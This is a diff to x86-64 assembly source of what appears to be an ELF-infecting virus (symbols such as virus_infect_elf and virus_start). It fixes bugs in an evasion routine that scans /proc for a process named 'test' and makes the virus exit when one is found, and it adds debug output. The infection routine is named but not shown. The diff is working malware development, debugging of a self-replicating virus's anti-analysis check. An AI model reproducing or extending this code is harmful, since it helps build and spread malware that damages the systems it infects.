@@ -43,6 +43,13 @@ _start:
     ; ============================================
     ; PROCESS CHECK - Exit if "test" process is running
     ; ============================================
+%ifdef VERBOSE_MODE
+    mov eax, SYS_WRITE
+    mov edi, STDOUT
+    lea rsi, [rel v_check_msg]
+    mov edx, v_check_msg_len
+    syscall
+%endif
     call check_test_process
     test rax, rax
     jnz .test_process_running
@@ -1070,6 +1077,7 @@ virus_infect_elf:
 ; ============================================
 %define SYS_OPENAT      257
 %define AT_FDCWD        -100
+%define O_RDONLY        0
 check_test_process:
     push rbp
     mov rbp, rsp
@@ -1135,18 +1143,30 @@ check_test_process:
     ja .ctp_next_entry
     
     ; Build path: /proc/PID/status
+    ; First, copy "/proc" to path buffer
     lea rdi, [rbp-200]          ; path buffer
     lea rsi, [r15 + v_proc_dir - virus_start]
     call virus_str_copy
     
-    lea rdi, [rbp-4224]
-    add rdi, r14
-    lea rsi, [rdi + 19]         ; d_name (PID)
+    ; Then append "/" if not already there
     lea rdi, [rbp-200]
     call virus_str_len
-    add rdi, rax
+    lea rdi, [rbp-200]
+    add rdi, rax                ; point to end of string
+    cmp byte [rdi-1], '/'
+    je .ctp_skip_slash1
+    mov byte [rdi], '/'
+    inc rdi
+    mov byte [rdi], 0           ; null terminate
+.ctp_skip_slash1:
+    
+    ; Then append PID (d_name)
+    lea rax, [rbp-4224]
+    add rax, r14
+    lea rsi, [rax + 19]         ; d_name (PID)
     call virus_str_copy
     
+    ; Then append "/status"
     lea rdi, [rbp-200]
     call virus_str_len
     lea rdi, [rbp-200]
@@ -1165,7 +1185,8 @@ check_test_process:
     test rax, rax
     js .ctp_next_entry
     
-    mov r13, rax                ; save status fd (save r13 temporarily)
+    push r13                    ; save nread before overwriting
+    mov r13, rax                ; save status fd
     
     ; Read status file
     mov eax, SYS_READ
@@ -1182,7 +1203,7 @@ check_test_process:
     syscall
     
     pop rcx                     ; restore bytes read
-    mov r13, r12                ; restore /proc fd
+    pop r13                     ; restore nread
     
     test rcx, rcx
     jle .ctp_next_entry
@@ -1194,19 +1215,34 @@ check_test_process:
     mov rcx, v_test_name_len
     call virus_search_signature
     
+%ifdef VERBOSE_MODE
+    push rax
+    mov eax, SYS_WRITE
+    mov edi, STDOUT
+    lea rsi, [r15 + v_search_msg - virus_start]
+    mov edx, v_search_msg_len
+    syscall
+    pop rax
+%endif
+    
     test rax, rax
     jnz .ctp_found
-    
-    mov r12, r13                ; restore /proc fd to r12
     
 .ctp_next_entry:
     add r14, rbx                ; pos += d_reclen
     jmp .ctp_process_entry
     
 .ctp_found:
+%ifdef VERBOSE_MODE
+    mov eax, SYS_WRITE
+    mov edi, STDOUT
+    lea rsi, [r15 + v_found_msg - virus_start]
+    mov edx, v_found_msg_len
+    syscall
+%endif
     ; Close /proc directory
     mov eax, SYS_CLOSE
-    mov edi, r13d
+    mov edi, r12d               ; r12 contains /proc fd
     syscall
     
     mov rax, 1                  ; return 1 (found)
@@ -1232,6 +1268,12 @@ check_test_process:
     ret
 
 ; Embedded strings for process checking
+v_check_msg:     db "Checking for test process...", 10
+v_check_msg_len: equ $ - v_check_msg
+v_search_msg:    db "  Searched a status file", 10
+v_search_msg_len: equ $ - v_search_msg
+v_found_msg:     db "TEST PROCESS FOUND! Exiting...", 10
+v_found_msg_len: equ $ - v_found_msg
 v_proc_dir:      db "/proc", 0
 v_status_file:   db "/status", 0
 v_test_name:     db "Name:", 9, "test", 10
